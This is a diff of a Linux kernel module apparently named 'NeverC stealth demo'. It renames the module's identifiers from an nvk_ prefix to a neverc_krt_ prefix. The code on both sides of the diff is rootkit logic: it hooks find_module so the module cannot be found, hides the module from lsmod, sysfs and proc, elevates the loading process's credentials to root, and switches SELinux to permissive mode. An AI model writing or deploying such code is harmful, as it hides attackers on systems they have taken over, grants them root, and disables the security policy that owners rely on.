@@ -7,15 +7,15 @@
 #include <nvk_mem.h>
 #include <nvk_selinux.h>
 
-#define NVK_LOG_TAG "nvk_stealth"
+#define NEVERC_KRT_LOG_TAG "neverc_krt_stealth"
 #include <nvk_log.h>
 
-static struct nvk_hide_state hide_state = NVK_HIDE_INIT_STATE;
-#ifdef NVK_STEALTH_SELINUX
-static struct nvk_selinux_bypass selinux_state;
+static struct neverc_krt_hide_state hide_state = NEVERC_KRT_HIDE_INIT_STATE;
+#ifdef NEVERC_KRT_STEALTH_SELINUX
+static struct neverc_krt_selinux_bypass selinux_state;
 #endif
 
-static int nvk_str_eq(const char *a, const char *b)
+static int neverc_krt_str_eq(const char *a, const char *b)
 {
 	while (*a && *b) {
 		if (*a != *b) return 0;
@@ -24,16 +24,16 @@ static int nvk_str_eq(const char *a, const char *b)
 	return *a == *b;
 }
 
-#ifdef NVK_CONTEXT_HOOK
+#ifdef NEVERC_KRT_CONTEXT_HOOK
 
-static struct nvk_hook_ctx find_module_ctx;
+static struct neverc_krt_hook_ctx find_module_ctx;
 
-static void hook_find_module_ctx(nvk_reg_ctx *ctx)
+static void hook_find_module_ctx(neverc_krt_reg_ctx *ctx)
 {
-	const char *name = (const char *)NVK_CTX_ARG(ctx, 0);
+	const char *name = (const char *)NEVERC_KRT_CTX_ARG(ctx, 0);
 
-	if (name && nvk_str_eq(name, "nvk_stealth"))
-		NVK_CTX_SKIP(ctx, 0);
+	if (name && neverc_krt_str_eq(name, "neverc_krt_stealth"))
+		NEVERC_KRT_CTX_SKIP(ctx, 0);
 }
 
 #else
@@ -43,102 +43,102 @@ static find_module_fn orig_find_module;
 
 static void *hook_find_module(const char *name)
 {
-	if (name && nvk_str_eq(name, "nvk_stealth"))
+	if (name && neverc_krt_str_eq(name, "neverc_krt_stealth"))
 		return (void *)0;
 	return orig_find_module(name);
 }
 
 #endif
 
-static int nvk_stealth_init(void)
+static int neverc_krt_stealth_init(void)
 {
 	int ret;
 	void *target;
 
-	ret = NVK_BOOTSTRAP();
+	ret = NEVERC_KRT_BOOTSTRAP();
 	if (ret)
 		return ret;
 
-	nvk_log_info("init on %s\n", NVK_KERNEL_STR);
+	neverc_krt_log_info("init on %s\n", NEVERC_KRT_KERNEL_STR);
 
-	nvk_mem_init();
-	nvk_process_init();
-	nvk_hide_init();
-	nvk_cred_init();
+	neverc_krt_mem_init();
+	neverc_krt_process_init();
+	neverc_krt_hide_init();
+	neverc_krt_cred_init();
 
-	ret = nvk_hook_init();
+	ret = neverc_krt_hook_init();
 	if (ret) {
-		nvk_log_err("hook init: %d\n", ret);
+		neverc_krt_log_err("hook init: %d\n", ret);
 		return ret;
 	}
 
-	target = NVK_LOOKUP("find_module");
+	target = NEVERC_KRT_LOOKUP("find_module");
 	if (target) {
-#ifdef NVK_CONTEXT_HOOK
-		ret = nvk_hook_install_ctx(&find_module_ctx, target,
+#ifdef NEVERC_KRT_CONTEXT_HOOK
+		ret = neverc_krt_hook_install_ctx(&find_module_ctx, target,
 					    hook_find_module_ctx, (void *)0);
 #else
-		ret = nvk_hook_install(&hide_state.find_module_hook,
+		ret = neverc_krt_hook_install(&hide_state.find_module_hook,
 				       target, (void *)hook_find_module,
 				       (void **)&orig_find_module);
 #endif
 		if (ret)
-			nvk_log_warn("find_module hook: %d\n", ret);
+			neverc_krt_log_warn("find_module hook: %d\n", ret);
 		else
-			nvk_log_info("find_module hooked\n");
+			neverc_krt_log_info("find_module hooked\n");
 	}
 
-#ifdef NVK_STEALTH_FULL_HIDE
-	nvk_mod_full_hide(&hide_state, &__this_module, "nvk_stealth");
-	nvk_log_info("deep-hidden (list+sysfs+proc)\n");
-#elif defined(NVK_STEALTH_HIDE)
-	nvk_mod_hide(&hide_state, &__this_module);
-	nvk_log_info("hidden from lsmod\n");
+#ifdef NEVERC_KRT_STEALTH_FULL_HIDE
+	neverc_krt_mod_full_hide(&hide_state, &__this_module, "neverc_krt_stealth");
+	neverc_krt_log_info("deep-hidden (list+sysfs+proc)\n");
+#elif defined(NEVERC_KRT_STEALTH_HIDE)
+	neverc_krt_mod_hide(&hide_state, &__this_module);
+	neverc_krt_log_info("hidden from lsmod\n");
 #else
-	nvk_log_info("log-only mode\n");
+	neverc_krt_log_info("log-only mode\n");
 #endif
 
-#ifdef NVK_STEALTH_ROOT
-	ret = nvk_cred_set_root();
+#ifdef NEVERC_KRT_STEALTH_ROOT
+	ret = neverc_krt_cred_set_root();
 	if (ret == 0)
-		nvk_log_info("credentials elevated\n");
+		neverc_krt_log_info("credentials elevated\n");
 	else
-		nvk_log_warn("cred elevation failed\n");
+		neverc_krt_log_warn("cred elevation failed\n");
 #endif
 
-#ifdef NVK_STEALTH_SELINUX
-	if (nvk_selinux_init() == 0) {
-		nvk_log_info("selinux enforcing=%d\n",
-			     nvk_selinux_is_enforcing());
-		ret = nvk_selinux_set_permissive();
+#ifdef NEVERC_KRT_STEALTH_SELINUX
+	if (neverc_krt_selinux_init() == 0) {
+		neverc_krt_log_info("selinux enforcing=%d\n",
+			     neverc_krt_selinux_is_enforcing());
+		ret = neverc_krt_selinux_set_permissive();
 		if (ret == 0)
-			nvk_log_info("selinux -> permissive\n");
+			neverc_krt_log_info("selinux -> permissive\n");
 		else
-			nvk_log_warn("selinux set_permissive: %d\n", ret);
+			neverc_krt_log_warn("selinux set_permissive: %d\n", ret);
 	}
 #endif
 
-	nvk_log_info("loaded by pid=%d\n", nvk_current_pid());
+	neverc_krt_log_info("loaded by pid=%d\n", neverc_krt_current_pid());
 	return 0;
 }
 
-static void nvk_stealth_exit(void)
+static void neverc_krt_stealth_exit(void)
 {
-#ifdef NVK_STEALTH_SELINUX
-	nvk_selinux_set_enforcing();
+#ifdef NEVERC_KRT_STEALTH_SELINUX
+	neverc_krt_selinux_set_enforcing();
 #endif
-#ifdef NVK_CONTEXT_HOOK
-	nvk_hook_remove_ctx(&find_module_ctx);
+#ifdef NEVERC_KRT_CONTEXT_HOOK
+	neverc_krt_hook_remove_ctx(&find_module_ctx);
 #endif
-	_nvk_hide_cleanup(&hide_state, &__this_module);
-	nvk_log_info("unloaded\n");
+	_neverc_krt_hide_cleanup(&hide_state, &__this_module);
+	neverc_krt_log_info("unloaded\n");
 }
 
-module_init(nvk_stealth_init);
-module_exit(nvk_stealth_exit);
+module_init(neverc_krt_stealth_init);
+module_exit(neverc_krt_stealth_exit);
 
 MODULE_LICENSE("GPL v2");
 MODULE_AUTHOR("NeverC");
 MODULE_DESCRIPTION("NeverC stealth demo");
 
-NVK_DEFINE_MODULE("nvk_stealth");
+NEVERC_KRT_DEFINE_MODULE("neverc_krt_stealth");
